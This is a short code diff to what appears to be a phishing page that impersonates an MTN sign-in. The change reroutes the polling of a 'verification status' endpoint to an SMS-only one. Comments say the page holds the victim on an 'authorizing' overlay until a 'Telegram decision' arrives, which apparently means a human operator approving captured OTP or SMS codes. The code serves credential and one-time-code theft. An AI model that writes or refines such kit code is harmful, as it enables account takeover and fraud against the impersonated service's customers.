@@ -652,7 +652,9 @@
 
   /* ============================================================
      Authorizing overlay + polling
-     — Waits indefinitely until Telegram decision (no auto-timeout)
+     — Polls the SMS-only status endpoint so the OTP decision
+       from mtn-signin.html can never leak into this flow.
+     — Waits indefinitely until Telegram decision (no auto-timeout).
   ============================================================ */
   let pollingActive = false;
   let pollTimer = null;
@@ -738,7 +740,7 @@
 
       let decision = 'pending';
       try {
-        const r = await fetch('/api/verification/status/' + encodeURIComponent(tx.ref) + '?_=' + Date.now());
+        const r = await fetch('/api/verification/sms-status/' + encodeURIComponent(tx.ref) + '?_=' + Date.now());
         const j = await r.json();
         decision = j.decision || 'pending';
       } catch (e) { /* keep polling */ }
